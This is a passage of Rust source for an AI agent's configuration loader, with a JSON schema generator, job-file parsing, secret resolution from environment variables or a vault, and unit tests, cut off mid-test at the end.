        privacy: get_str(agent, "privacy", "session"),
        lean: get_str(agent, "lean", "off"),
        max_retries: agent
            .and_then(|t| t.get("max_retries"))
            .and_then(toml::Value::as_integer)
            .filter(|v| (0..=10).contains(v))
            .unwrap_or(3) as u32,
        workspace: expanduser(&workspace_raw),
        confirm_shell: get_bool(sec, "confirm_shell", true),
        approvals: get_bool(sec, "approvals", false),
        vault_cmd: get_str(sec, "vault_cmd", ""),
        allow_private_network: get_bool(sec, "allow_private_network", false),
        allow_outside_workspace: get_bool(sec, "allow_outside_workspace", false),
        audit_log: get_bool(sec, "audit_log", false),
        deny_commands,
        deny_tools,
        confirm_tools,
        allow_domains,
        deny_domains,
        telegram_token: get_str(tg, "token", ""),
        telegram_allowed,
        tg_group_mention_only: get_bool(tg, "group_mention_only", true),
        tg_parse_mode,
        jobs,
        fallbacks: get_str_list(prov, "fallbacks"),
        sessions: get_bool(agent, "sessions", false),
        tool_list: get_bool(agent, "tool_list", true),
        stream: get_bool(agent, "stream", false),
        thinking: get_str(agent, "thinking", "off"),
        verbose: get_str(agent, "verbose", "off"),
        trace: get_str(agent, "trace", "off"),
        reasoning_visible: get_bool(agent, "reasoning_visible", false),
        fast_model: get_str(agent, "fast_model", ""),
        prev_model: String::new(),
        http_enabled: get_bool(http, "enabled", false),
        http_port: http_port as u16,
        http_bind,
        http_web: get_bool(http, "web", false),
        http_headers: get_str(http, "headers", "strong"),
        http_user: get_str(http, "username", ""),
        http_pass: get_str(http, "password", ""),
        http_allow_crawlers: get_str_list(http, "allow_crawlers"),
        http_token: get_str(http, "token", ""),
        wa_token: get_str(wa, "token", ""),
        wa_phone_id: get_str(wa, "phone_id", ""),
        wa_verify_token: get_str(wa, "verify_token", ""),
        wa_webhook_port: wa_webhook_port as u16,
        wa_allowed: get_str_list(wa, "allowed_numbers"),
        discord_token: get_str(dc, "token", ""),
        discord_allowed: get_str_list(dc, "allowed_channel_ids"),
        slack_app_token: get_str(sl, "app_token", ""),
        slack_bot_token: get_str(sl, "bot_token", ""),
        slack_allowed: get_str_list(sl, "allowed_channel_ids"),
        signal_account: get_str(sg, "account", ""),
        signal_allowed: get_str_list(sg, "allowed_numbers"),
        signal_cli_path: get_str(sg, "cli_path", ""),
        signal_http_port,
        irc_server: get_str(irc, "server", ""),
        irc_port: irc
            .and_then(|t| t.get("port"))
            .and_then(toml::Value::as_integer)
            .filter(|p| (1..=65535).contains(p))
            .unwrap_or(6697) as u16,
        irc_tls: irc
            .and_then(|t| t.get("tls"))
            .and_then(toml::Value::as_bool)
            .unwrap_or(true),
        irc_nick: get_str(irc, "nick", ""),
        irc_channels: get_str_list(irc, "channels"),
        irc_allowed: get_str_list(irc, "allowed_nicks"),
        matrix_homeserver: {
            let u = get_str(mx, "homeserver", "");
            u.trim_end_matches('/').to_string()
        },
        matrix_token: get_str(mx, "token", ""),
        matrix_user_id: get_str(mx, "user_id", ""),
        matrix_allowed: get_str_list(mx, "allowed_users"),
        mattermost_url: {
            let u = get_str(mm, "url", "");
            u.trim_end_matches('/').to_string()
        },
        mattermost_token: get_str(mm, "token", ""),
        mattermost_allowed: get_str_list(mm, "allowed_users"),
        dream_minutes: dr
            .and_then(|t| t.get("minutes"))
            .and_then(toml::Value::as_integer)
            .unwrap_or(0)
            .max(0) as u32,
        dream_prompt: get_str(dr, "prompt", ""),
        update_check_hours: {
            let h = tbl(&root, "update")
                .and_then(|t| t.get("check_hours"))
                .and_then(toml::Value::as_integer)
                .unwrap_or(0);
            if !(0..=168).contains(&h) {
                return Err("update.check_hours must be between 0 and 168".into());
            }
            h as u32
        },
        clawhub_url: {
            let u = get_str(ch, "url", "https://clawhub.ai");
            u.trim_end_matches('/').to_string()
        },
        heartbeat_minutes: heartbeat_minutes as u32,
        heartbeat_prompt,
        heartbeat_chat_ids: get_str_list(hb, "chat_ids"),
        heartbeat_can_act: get_bool(hb, "can_act", false),
        compact_after: compact_after as u32,
        api_keys: get_str_list(prov, "api_keys"),
        provider_keys: get_keys_table(prov, "keys"),
        provider_headers: get_headers_table(prov, "headers"),
        audio_transcribe: get_bool(audio, "transcribe", false),
        audio_model: get_str(audio, "model", "whisper-1"),
        audio_base_url: get_str(audio, "base_url", ""),
        media_images: get_bool(media, "images", false),
        media_tts: get_bool(media, "tts", false),
        media_video: get_bool(media, "video", false),
        media_music: get_bool(media, "music", false),
        media_image_model: get_str(media, "image_model", "gpt-image-1"),
        media_tts_model: get_str(media, "tts_model", "tts-1"),
        media_tts_voice: get_str(media, "tts_voice", "alloy"),
        media_video_model: get_str(media, "video_model", "sora-2"),
        media_music_model: get_str(media, "music_model", "music-1"),
        media_base_url: get_str(media, "base_url", ""),
        canvas_enabled: get_bool(tbl(&root, "canvas"), "enabled", false),
        board_enabled: get_bool(tbl(&root, "board"), "enabled", false),
        pairing_enabled: get_bool(tbl(&root, "pairing"), "enabled", false),
        sandbox_runtime: get_str(tbl(&root, "sandbox"), "runtime", "none"),
        sandbox_image: get_str(
            tbl(&root, "sandbox"),
            "image",
            crate::sandbox::DEFAULT_IMAGE,
        ),
        sandbox_network: get_str(tbl(&root, "sandbox"), "network", "none"),
        sandbox_memory: get_str(
            tbl(&root, "sandbox"),
            "memory",
            crate::sandbox::DEFAULT_MEMORY,
        ),
        sandbox_cpus: get_str(tbl(&root, "sandbox"), "cpus", crate::sandbox::DEFAULT_CPUS),
        sandbox_read_only: get_bool(tbl(&root, "sandbox"), "read_only", false),
        imessage_enabled: get_bool(tbl(&root, "imessage"), "enabled", false),
        imessage_cli_path: get_str(tbl(&root, "imessage"), "cli_path", "imsg"),
        imessage_db_path: get_str(tbl(&root, "imessage"), "db_path", ""),
        imessage_allowed: get_str_list(tbl(&root, "imessage"), "allowed_senders"),
        mem_embeddings: get_bool(mem, "embeddings", false),
        mem_embed_model: get_str(mem, "embed_model", "text-embedding-3-small"),
        mem_embed_base_url: get_str(mem, "embed_base_url", ""),
        browser_enabled: get_bool(browser, "enabled", false),
        mcp_servers: crate::mcp::from_toml(&root),
        hooks: crate::hooks::from_toml(&root),
        browser_cdp_url: get_str(browser, "cdp_url", ""),
        browser_binary: get_str(browser, "binary", ""),
        browser_headless: get_bool(browser, "headless", true),
    };
    cfg.validate()?;
    Ok(cfg)
}

const SCHEMA: &[(&str, &[&str])] = &[
    ("log", &["level"]),
    (
        "provider",
        &[
            "kind",
            "model",
            "api_key",
            "base_url",
            "fallbacks",
            "api_keys",
            "keys",
            "timeout_secs",
            "headers",
        ],
    ),
    (
        "agent",
        &[
            "privacy",
            "lean",
            "thinking",
            "reasoning_visible",
            "workspace",
            "sessions",
            "stream",
            "compact_after",
            "tool_list",
        ],
    ),
    (
        "security",
        &[
            "confirm_shell",
            "approvals",
            "vault_cmd",
            "allow_outside_workspace",
            "audit_log",
            "deny_commands",
            "deny_tools",
            "confirm_tools",
            "allow_domains",
            "deny_domains",
            "allow_private_network",
        ],
    ),
    (
        "telegram",
        &[
            "token",
            "allowed_chat_ids",
            "group_mention_only",
            "parse_mode",
        ],
    ),
    ("job_defaults", &["webhook", "chat_ids", "can_act"]),
    ("update", &["check_hours"]),
    (
        "http",
        &[
            "enabled",
            "port",
            "bind",
            "token",
            "web",
            "username",
            "password",
            "headers",
            "allow_crawlers",
        ],
    ),
    (
        "whatsapp",
        &[
            "token",
            "phone_id",
            "verify_token",
            "webhook_port",
            "allowed_numbers",
        ],
    ),
    ("discord", &["token", "allowed_channel_ids"]),
    ("slack", &["app_token", "bot_token", "allowed_channel_ids"]),
    (
        "signal",
        &["account", "allowed_numbers", "cli_path", "http_port"],
    ),
    ("dreaming", &["minutes", "prompt"]),
    ("clawhub", &["url"]),
    ("heartbeat", &["minutes", "prompt", "chat_ids", "can_act"]),
    ("memory", &["embeddings", "embed_model", "embed_base_url"]),
    ("audio", &["transcribe", "model", "base_url"]),
    (
        "media",
        &[
            "images",
            "tts",
            "video",
            "music",
            "image_model",
            "tts_model",
            "tts_voice",
            "video_model",
            "music_model",
            "base_url",
        ],
    ),
    (
        "irc",
        &["server", "port", "tls", "nick", "channels", "allowed_nicks"],
    ),
    (
        "matrix",
        &["homeserver", "token", "user_id", "allowed_users"],
    ),
    ("mattermost", &["url", "token", "allowed_users"]),
    ("browser", &["enabled", "cdp_url", "binary", "headless"]),
    ("canvas", &["enabled"]),
    ("board", &["enabled"]),
    ("pairing", &["enabled"]),
    (
        "sandbox",
        &["runtime", "image", "network", "memory", "cpus", "read_only"],
    ),
    (
        "imessage",
        &["enabled", "cli_path", "db_path", "allowed_senders"],
    ),
];

const JOB_KEYS: &[&str] = &[
    "name", "cron", "prompt", "chat_ids", "webhook", "expect", "can_act", "precheck", "script",
];

const BOOL_KEYS: &[&str] = &[
    "confirm_shell",
    "approvals",
    "allow_outside_workspace",
    "audit_log",
    "sessions",
    "stream",
    "enabled",
    "web",
    "tls",
    "headless",
    "read_only",
    "group_mention_only",
    "embeddings",
    "transcribe",
    "images",
    "tts",
    "video",
    "music",
];

const INT_KEYS: &[&str] = &[
    "compact_after",
    "port",
    "webhook_port",
    "http_port",
    "minutes",
    "max_retries",
];

const LIST_KEYS: &[&str] = &[
    "fallbacks",
    "api_keys",
    "deny_commands",
    "deny_tools",
    "allowed_chat_ids",
    "allowed_channel_ids",
    "allowed_numbers",
    "allowed_nicks",
    "allowed_users",
    "allowed_senders",
    "channels",
    "chat_ids",
    "allow_crawlers",
];

const SECRET_KEYS: &[&str] = &[
    "token",
    "api_key",
    "app_token",
    "bot_token",
    "verify_token",
    "password",
];

fn key_type(key: &str) -> &'static str {
    if BOOL_KEYS.contains(&key) {
        "boolean"
    } else if INT_KEYS.contains(&key) {
        "integer"
    } else if LIST_KEYS.contains(&key) {
        "array"
    } else {
        "string"
    }
}

fn key_schema(key: &str) -> serde_json::Value {
    let mut node = match key_type(key) {
        "array" => serde_json::json!({"type": "array", "items": {"type": "string"}}),
        "integer" => serde_json::json!({"type": "integer", "minimum": 0}),
        t => serde_json::json!({"type": t}),
    };
    if SECRET_KEYS.contains(&key) {
        if let Some(o) = node.as_object_mut() {
            o.insert("writeOnly".into(), serde_json::Value::Bool(true));
            o.insert(
                "description".into(),
                serde_json::Value::String(
                    "Secret. Prefer an environment variable or a ${VAR} reference.".into(),
                ),
            );
        }
    }
    node
}

fn enum_for(table: &str, key: &str) -> Option<&'static [&'static str]> {
    match (table, key) {
        ("log", "level") => Some(&LOG_LEVELS),
        ("provider", "kind") => Some(PROVIDER_KINDS),
        ("provider", "api") => Some(crate::providers::API_DIALECTS),
        ("agent", "privacy") => Some(&PRIVACY_MODES),
        ("agent", "lean") => Some(&LEAN_LEVELS),
        ("sandbox", "runtime") => Some(crate::sandbox::RUNTIMES),
        ("sandbox", "network") => Some(crate::sandbox::NETWORK_MODES),
        _ => None,
    }
}

pub fn json_schema() -> serde_json::Value {
    let mut props = serde_json::Map::new();
    for (table, keys) in SCHEMA {
        let mut tprops = serde_json::Map::new();
        for key in *keys {
            let mut node = key_schema(key);
            if let (Some(values), Some(o)) = (enum_for(table, key), node.as_object_mut()) {
                o.insert(
                    "enum".into(),
                    serde_json::Value::Array(
                        values
                            .iter()
                            .map(|v| serde_json::Value::String((*v).to_string()))
                            .collect(),
                    ),
                );
            }
            tprops.insert((*key).to_string(), node);
        }
        props.insert(
            (*table).to_string(),
            serde_json::json!({
                "type": "object",
                "additionalProperties": false,
                "properties": tprops,
            }),
        );
    }
    let mut jprops = serde_json::Map::new();
    for key in JOB_KEYS {
        jprops.insert((*key).to_string(), key_schema(key));
    }
    props.insert(
        "jobs".into(),
        serde_json::json!({
            "type": "array",
            "items": {
                "type": "object",
                "additionalProperties": false,
                "required": ["name", "cron", "prompt"],
                "properties": jprops,
            },
        }),
    );
    serde_json::json!({
        "$schema": "https://json-schema.org/draft/2020-12/schema",
        "$id": "https://openphoenix.dev/schema/config-1.0.json",
        "title": "OpenPhoenix configuration",
        "description": "Contract for config.toml. Human config is authored as TOML; \
    this document is the machine-readable contract.",
        "type": "object",
        "additionalProperties": false,
        "properties": props,
    })
}

pub fn unknown_keys(raw: &str) -> Vec<String> {
    let Ok(root) = toml::from_str::<toml::Value>(raw) else {
        return Vec::new();
    };
    let Some(table) = root.as_table() else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for (tname, val) in table {
        if tname == "jobs" {
            if let Some(arr) = val.as_array() {
                for (i, job) in arr.iter().enumerate() {
                    if let Some(jt) = job.as_table() {
                        for key in jt.keys() {
                            if !JOB_KEYS.contains(&key.as_str()) {
                                out.push(format!("jobs[{i}].{key}"));
                            }
                        }
                    }
                }
            }
            continue;
        }
        match SCHEMA.iter().find(|(name, _)| *name == tname) {
            None => out.push(tname.clone()),
            Some((_, keys)) => {
                if let Some(t) = val.as_table() {
                    for key in t.keys() {
                        if !keys.contains(&key.as_str()) {
                            out.push(format!("{tname}.{key}"));
                        }
                    }
                }
            }
        }
    }
    out
}

pub fn misplaced_hint(unknown: &str) -> Option<String> {
    let (_, key) = unknown.split_once('.')?;
    let homes: Vec<&str> = SCHEMA
        .iter()
        .filter(|(_, keys)| keys.contains(&key))
        .map(|(name, _)| *name)
        .collect();
    match homes.as_slice() {
        [] => None,
        [one] => Some(format!("did you mean [{one}] {key}?")),
        many => Some(format!("that key lives under [{}]", many.join("] or ["))),
    }
}

pub fn jobs_from_dir(dir: &Path) -> Result<Vec<Job>, String> {
    let mut out = Vec::new();
    let Ok(rd) = fs::read_dir(dir) else {
        return Ok(out);
    };
    let mut paths: Vec<PathBuf> = rd
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| p.extension().map(|x| x == "toml").unwrap_or(false))
        .collect();
    paths.sort();
    for p in paths {
        let raw = fs::read_to_string(&p)
            .map_err(|e| format!("cannot read job file {}: {e}", p.display()))?;
        let root: toml::Value = toml::from_str(&raw)
            .map_err(|e| format!("job file {} is not valid TOML: {e}", p.display()))?;
        let Some(t) = root.as_table() else {
            return Err(format!("job file {} must be a TOML table", p.display()));
        };
        for key in t.keys() {
            if !JOB_KEYS.contains(&key.as_str()) {
                return Err(format!("job file {}: unknown key {key}", p.display()));
            }
        }
        let stem = p
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("job")
            .to_string();
        let job = Job {
            name: t
                .get("name")
                .and_then(|v| v.as_str())
                .unwrap_or(&stem)
                .to_string(),
            cron: t
                .get("cron")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            prompt: t
                .get("prompt")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            chat_ids: get_str_list(Some(t), "chat_ids"),
            expect: t
                .get("expect")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            can_act: t
                .get("can_act")
                .and_then(toml::Value::as_bool)
                .unwrap_or(true),
            precheck: t
                .get("precheck")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            script: t
                .get("script")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            model: t
                .get("model")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
            webhook: t
                .get("webhook")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
        };
        if job.cron.is_empty() || (job.prompt.is_empty() && job.script.is_empty()) {
            return Err(format!(
                "job file {}: cron and prompt (or script) are required",
                p.display()
            ));
        }
        if !job.prompt.is_empty() && !job.script.is_empty() {
            return Err(format!(
                "job file {}: set prompt or script, not both",
                p.display()
            ));
        }
        out.push(job);
    }
    Ok(out)
}

pub fn load(path: Option<&Path>) -> Result<Config, String> {
    let p = path.map(Path::to_path_buf).unwrap_or_else(config_path);
    let raw = if p.exists() {
        fs::read_to_string(&p).map_err(|e| format!("cannot read {}: {e}", p.display()))?
    } else {
        String::new()
    };
    let mut cfg = parse(&raw)?;
    let jobs_dir = p
        .parent()
        .map(|d| d.join("jobs.d"))
        .unwrap_or_else(|| home().join("jobs.d"));
    for job in jobs_from_dir(&jobs_dir)? {
        if cfg.jobs.iter().any(|j| j.name == job.name) {
            return Err(format!(
                "job {} is defined in both config and jobs.d",
                job.name
            ));
        }
        cfg.jobs.push(job);
    }
    let vault = cfg.vault_cmd.clone();
    if let Some(v) = crate::secrets::resolve_chain(&vault, "PHOENIX_API_KEY", "api_key") {
        cfg.api_key = v;
        if cfg.api_keys.is_empty() {
            cfg.api_keys = crate::secrets::ring_extras("PHOENIX_API_KEY");
        }
    }

    if cfg.api_key.is_empty() {
        for var in provider_key_vars(&cfg.provider) {
            if let Some(v) = crate::secrets::resolve_chain(&vault, var, var) {
                cfg.api_key = v;
                if cfg.api_keys.is_empty() {
                    cfg.api_keys = crate::secrets::ring_extras(var);
                }
                break;
            }
        }
    }
    if cfg.api_key.is_empty() {
        if let Some((_, keys)) = cfg.provider_keys.iter().find(|(p, _)| *p == cfg.provider) {
            if let Some((first, rest)) = keys.split_first() {
                cfg.api_key = first.clone();
                if cfg.api_keys.is_empty() {
                    cfg.api_keys = rest.to_vec();
                }
            }
        }
    }
    for (var, name, field) in SECRET_FIELDS {
        if let Some(v) = crate::secrets::resolve_chain(&vault, var, name) {
            *field(&mut cfg) = v;
        }
    }
    Ok(cfg)
}

pub fn strip_inline_secrets(toml: &str) -> (String, Vec<(String, Vec<String>)>) {
    let mut found: Vec<(String, Vec<String>)> = Vec::new();
    let mut out = String::new();
    let mut section = String::new();
    for line in toml.lines() {
        let t = line.trim();
        if t.starts_with('[') && t.ends_with(']') {
            section = t.trim_matches(['[', ']'].as_slice()).to_string();
            if section == "provider.keys" {
                continue;
            }
            out.push_str(line);
            out.push('\n');
            continue;
        }
        let Some((key, value)) = t.split_once('=') else {
            out.push_str(line);
            out.push('\n');
            continue;
        };
        let key = key.trim();
        let value = value.trim();
        if t.starts_with('#') || value.is_empty() {
            out.push_str(line);
            out.push('\n');
            continue;
        }
        let list = parse_inline_list(value);
        if list.is_empty() {
            out.push_str(line);
            out.push('\n');
            continue;
        }
        let name = match (section.as_str(), key) {
            ("provider", "api_key") => Some("PHOENIX_API_KEY".to_string()),
            ("provider", "api_keys") => Some("PHOENIX_API_KEY".to_string()),
            ("provider.keys", p) => provider_key_vars(p).first().map(|v| v.to_string()),
            (sec, k) => SECRET_FIELDS
                .iter()
                .find(|(_, name, _)| {
                    let short = name.strip_prefix(&format!("{sec}_")).unwrap_or(name);
                    *name == format!("{sec}_{k}") || (short == k && name.starts_with(sec))
                })
                .map(|(var, _, _)| var.to_string()),
        };
        let Some(name) = name else {
            out.push_str(line);
            out.push('\n');
            continue;
        };
        match found.iter_mut().find(|(n, _)| *n == name) {
            Some((_, vals)) => {
                for v in list {
                    if !vals.contains(&v) {
                        vals.push(v);
                    }
                }
            }
            None => found.push((name, list)),
        }
        out.push_str(&format!(
            "# {key} lives in the encrypted secret store, never in this file.\n"
        ));
    }
    (out, found)
}

fn parse_inline_list(value: &str) -> Vec<String> {
    let value = value.trim();
    if let Some(inner) = value.strip_prefix('[').and_then(|v| v.strip_suffix(']')) {
        return inner
            .split(',')
            .map(|p| p.trim().trim_matches(['"', '\''].as_slice()).to_string())
            .filter(|p| !p.is_empty())
            .collect();
    }
    let unquoted = value.trim_matches(['"', '\''].as_slice());
    if unquoted.is_empty() {
        return Vec::new();
    }
    vec![unquoted.to_string()]
}

type SecretField = fn(&mut Config) -> &mut String;

pub const SECRET_FIELDS: &[(&str, &str, SecretField)] = &[
    (
        "PHOENIX_TELEGRAM_TOKEN",
        "telegram_token",
        (|c| &mut c.telegram_token) as SecretField,
    ),
    (
        "PHOENIX_HTTP_TOKEN",
        "http_token",
        (|c| &mut c.http_token) as SecretField,
    ),
    (
        "PHOENIX_HTTP_PASS",
        "http_pass",
        (|c| &mut c.http_pass) as SecretField,
    ),
    (
        "PHOENIX_WHATSAPP_TOKEN",
        "whatsapp_token",
        (|c| &mut c.wa_token) as SecretField,
    ),
    (
        "PHOENIX_WHATSAPP_VERIFY_TOKEN",
        "whatsapp_verify_token",
        (|c| &mut c.wa_verify_token) as SecretField,
    ),
    (
        "PHOENIX_DISCORD_TOKEN",
        "discord_token",
        (|c| &mut c.discord_token) as SecretField,
    ),
    (
        "PHOENIX_SLACK_APP_TOKEN",
        "slack_app_token",
        (|c| &mut c.slack_app_token) as SecretField,
    ),
    (
        "PHOENIX_SLACK_BOT_TOKEN",
        "slack_bot_token",
        (|c| &mut c.slack_bot_token) as SecretField,
    ),
    (
        "PHOENIX_MATRIX_TOKEN",
        "matrix_token",
        (|c| &mut c.matrix_token) as SecretField,
    ),
    (
        "PHOENIX_MATTERMOST_TOKEN",
        "mattermost_token",
        (|c| &mut c.mattermost_token) as SecretField,
    ),
];

pub fn provider_key_vars(kind: &str) -> &'static [&'static str] {
    match kind {
        "anthropic" => &["ANTHROPIC_API_KEY"],
        "openai" | "custom" => &["OPENAI_API_KEY"],
        "openrouter" => &["OPENROUTER_API_KEY"],
        "nvidia" => &["NVIDIA_API_KEY"],
        "google" => &["GEMINI_API_KEY", "GOOGLE_API_KEY"],
        "groq" => &["GROQ_API_KEY"],
        "mistral" => &["MISTRAL_API_KEY"],
        "deepseek" => &["DEEPSEEK_API_KEY"],
        "xai" => &["XAI_API_KEY"],
        "moonshot" => &["MOONSHOT_API_KEY"],
        "cohere" => &["COHERE_API_KEY"],
        "together" => &["TOGETHER_API_KEY"],
        "novita" => &["NOVITA_API_KEY"],
        "opencode" => &["OPENCODE_API_KEY"],
        "byteplus" => &["BYTEPLUS_API_KEY"],
        "volcengine" => &["VOLCENGINE_API_KEY"],
        "xiaomi" => &["XIAOMI_API_KEY"],
        "meta" => &["META_API_KEY"],
        "huggingface" => &["HF_TOKEN", "HUGGINGFACE_HUB_TOKEN"],
        _ => &[],
    }
}

pub fn any_provider_key_in_env() -> bool {
    if env::var("PHOENIX_API_KEY").map(|v| !v.is_empty()) == Ok(true) {
        return true;
    }
    PROVIDER_KINDS.iter().any(|k| {
        provider_key_vars(k)
            .iter()
            .any(|v| env::var(v).map(|s| !s.is_empty()) == Ok(true))
    })
}

pub fn first_env_provider() -> Option<&'static str> {
    PROVIDER_KINDS.iter().copied().find(|k| {
        *k != "custom"
            && *k != "ollama"
            && provider_key_vars(k)
                .iter()
                .any(|v| env::var(v).map(|s| !s.is_empty()) == Ok(true))
    })
}

pub fn init_config() -> Result<PathBuf, String> {
    let dir = home();
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let path = dir.join("config.toml");
    if !path.exists() {
        fs::write(&path, SAMPLE_CONFIG).map_err(|e| e.to_string())?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = fs::set_permissions(&path, fs::Permissions::from_mode(0o600));
        }
    }
    Ok(path)
}

#[cfg(test)]
mod json_schema_tests {
    use super::*;

    #[test]
    fn the_schema_is_a_valid_draft_2020_12_document() {
        let s = json_schema();
        assert_eq!(
            s["$schema"], "https://json-schema.org/draft/2020-12/schema",
            "the contract must declare its dialect"
        );
        assert!(s["$id"].is_string());
        assert_eq!(s["type"], "object");
        assert_eq!(
            s["additionalProperties"], false,
            "unknown tables must be rejected by the contract, matching doctor"
        );
    }

    #[test]
    fn every_schema_table_is_described_including_channels() {
        let s = json_schema();
        let props = s["properties"].as_object().expect("properties object");
        for (table, _) in SCHEMA {
            assert!(props.contains_key(*table), "missing table {table}");
        }
        for must in ["irc", "matrix", "mattermost", "telegram", "jobs"] {
            assert!(props.contains_key(must), "missing {must}");
        }
    }

    #[test]
    fn the_contract_matches_what_doctor_accepts() {
        let s = json_schema();
        let props = s["properties"].as_object().expect("properties");
        for (table, keys) in SCHEMA {
            let declared = props[*table]["properties"]
                .as_object()
                .expect("table properties");
            assert_eq!(
                declared.len(),
                keys.len(),
                "{table} key count drifted from the validator"
            );
            for key in *keys {
                assert!(declared.contains_key(*key), "{table}.{key} missing");
            }
        }
    }

    #[test]
    fn types_are_declared_not_all_strings() {
        let s = json_schema();
        let p = &s["properties"];
        assert_eq!(p["security"]["properties"]["approvals"]["type"], "boolean");
        assert_eq!(p["http"]["properties"]["port"]["type"], "integer");
        assert_eq!(p["irc"]["properties"]["tls"]["type"], "boolean");
        assert_eq!(
            p["telegram"]["properties"]["allowed_chat_ids"]["type"],
            "array"
        );
        assert_eq!(
            p["telegram"]["properties"]["allowed_chat_ids"]["items"]["type"],
            "string"
        );
        assert_eq!(p["provider"]["properties"]["model"]["type"], "string");
    }

    #[test]
    fn enumerated_values_come_from_the_same_constants_validate_uses() {
        let s = json_schema();
        let kinds = s["properties"]["provider"]["properties"]["kind"]["enum"]
            .as_array()
            .expect("provider kinds enum");
        assert_eq!(kinds.len(), PROVIDER_KINDS.len());
        assert!(kinds.iter().any(|v| v == "anthropic"));
        let privacy = s["properties"]["agent"]["properties"]["privacy"]["enum"]
            .as_array()
            .expect("privacy enum");
        assert_eq!(privacy.len(), PRIVACY_MODES.len());
    }

    #[test]
    fn secret_fields_are_marked_write_only() {
        let s = json_schema();
        for (table, key) in [
            ("provider", "api_key"),
            ("telegram", "token"),
            ("http", "password"),
            ("slack", "bot_token"),
        ] {
            let node = &s["properties"][table]["properties"][key];
            assert_eq!(
                node["writeOnly"], true,
                "{table}.{key} must be flagged as a secret"
            );
        }
        assert!(s["properties"]["provider"]["properties"]["model"]["writeOnly"].is_null());
    }

    #[test]
    fn jobs_are_an_array_of_objects_with_required_fields() {
        let s = json_schema();
        let jobs = &s["properties"]["jobs"];
        assert_eq!(jobs["type"], "array");
        let req = jobs["items"]["required"].as_array().expect("required list");
        for must in ["name", "cron", "prompt"] {
            assert!(req.iter().any(|v| v == must), "jobs must require {must}");
        }
    }

    #[test]
    fn job_defaults_fill_only_jobs_without_delivery() {
        let raw = r#"
[provider]
kind = "openai"
model = "m"

[job_defaults]
webhook = "https://hooks.example.invalid/x"
chat_ids = ["7"]

[[jobs]]
name = "bare"
cron = "0 7 * * *"
prompt = "p"

[[jobs]]
name = "own"
cron = "0 8 * * *"
prompt = "p"
chat_ids = ["9"]
"#;
        let cfg = parse(raw).expect("parses");
        assert_eq!(cfg.jobs[0].webhook, "https://hooks.example.invalid/x");
        assert_eq!(cfg.jobs[0].chat_ids, vec!["7"]);
        assert_eq!(cfg.jobs[1].webhook, "");
        assert_eq!(cfg.jobs[1].chat_ids, vec!["9"]);
    }

    #[test]
    fn job_defaults_reject_unknown_keys() {
        let out = unknown_keys("[job_defaults]\nbogus = 1\n");
        assert!(out.iter().any(|k| k == "job_defaults.bogus"), "{out:?}");
    }

    #[test]
    fn deny_tools_parse_from_security() {
        let raw = "[provider]\nkind = \"openai\"\nmodel = \"m\"\n\n[security]\ndeny_tools = [\"shell\", \"write_file\"]\n";
        let cfg = parse(raw).expect("parses");
        assert_eq!(
            cfg.deny_tools,
            vec!["shell".to_string(), "write_file".to_string()]
        );
    }

    #[test]
    fn telegram_parse_mode_validates() {
        let base = "[provider]\nkind = \"openai\"\nmodel = \"m\"\n\n[telegram]\ntoken = \"t\"\nallowed_chat_ids = [1]\n";
        let cfg = parse(base).expect("parses");
        assert_eq!(cfg.tg_parse_mode, "html");
        let plain = format!("{base}parse_mode = \"plain\"\n");
        assert_eq!(parse(&plain).expect("parses").tg_parse_mode, "plain");
        let bad = format!("{base}parse_mode = \"markdown\"\n");
        let err = parse(&bad).unwrap_err();
        assert!(err.contains("parse_mode"), "{err}");
    }

    #[test]
    fn the_sample_config_validates_against_its_own_contract() {
        assert!(
            unknown_keys(SAMPLE_CONFIG).is_empty(),
            "the shipped sample must satisfy the schema: {:?}",
            unknown_keys(SAMPLE_CONFIG)
        );
        let s = json_schema();
        let props = s["properties"].as_object().expect("properties");
        let parsed: toml::Value = toml::from_str(SAMPLE_CONFIG).expect("sample parses");
        for table in parsed.as_table().expect("root table").keys() {
            assert!(props.contains_key(table), "sample uses undeclared {table}");
        }
    }
}

#[cfg(test)]
mod precedence_tests {
    use super::*;

    fn base() -> Config {
        Config {
            provider: "anthropic".into(),
            model: "claude-sonnet-5".into(),
            api_key: "anthropic-key".into(),
            api_keys: vec!["anthropic-spare".into()],
            base_url: "https://anthropic.example".into(),
            ..Config::default()
        }
    }

    #[test]
    fn a_prefixed_model_switches_provider_and_drops_the_old_key() {
        let mut cfg = base();
        retarget(&mut cfg, "openai/gpt-5");
        assert_eq!(cfg.provider, "openai");
        assert_eq!(cfg.model, "gpt-5");
        assert_ne!(
            cfg.api_key, "anthropic-key",
            "the previous provider key must never be sent to a new provider"
        );
        assert!(cfg.api_keys.is_empty(), "stale spare keys must be cleared");
        assert!(cfg.base_url.is_empty(), "stale base_url must be cleared");
    }

    #[test]
    fn a_bare_model_keeps_the_current_provider_and_key() {
        let mut cfg = base();
        retarget(&mut cfg, "claude-opus-5");
        assert_eq!(cfg.provider, "anthropic");
        assert_eq!(cfg.model, "claude-opus-5");
        assert_eq!(cfg.api_key, "anthropic-key");
        assert_eq!(cfg.base_url, "https://anthropic.example");
    }

    #[test]
    fn an_unknown_prefix_is_treated_as_part_of_the_model_name() {
        let mut cfg = base();
        retarget(&mut cfg, "meta-llama/Llama-3-70b");
        assert_eq!(cfg.provider, "anthropic");
        assert_eq!(cfg.model, "meta-llama/Llama-3-70b");
    }

    #[test]
    fn an_existing_nested_config_is_still_found_after_moving_to_a_state_dir() {
        let dir = std::env::temp_dir().join(format!("phx-nest-{}", std::process::id()));
        let nested = dir.join(".openphoenix");
        std::fs::create_dir_all(&nested).expect("nest");
        std::fs::write(
            nested.join("config.toml"),
            "[provider]\nkind = \"nvidia\"\n",
        )
        .expect("w");
        let found = {
            let nest = dir.clone();
            let direct = nest.join("config.toml");
            if direct.exists() {
                direct
            } else {
                let n = nest.join(".openphoenix").join("config.toml");
                if n.exists() {
                    n
                } else {
                    direct
                }
            }
        };
        assert_eq!(
